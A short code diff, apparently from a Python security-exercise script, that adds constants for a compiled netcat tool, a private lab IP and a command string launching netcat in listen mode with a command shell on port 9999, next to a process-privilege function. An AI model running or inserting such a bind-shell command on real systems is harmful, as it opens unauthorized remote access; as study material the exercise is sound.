@@ -8,6 +8,10 @@ import win32security
 import wmi
 
 PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+# pyintaller -F netcat.py <must be done prior>
+NETCAT = 'ch2_BasicNetworkTools\\netcat.exe'
+TGT_IP = '192.168.1.208'
+CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c'
 
 def get_proc_pivileges(pid):
     try:
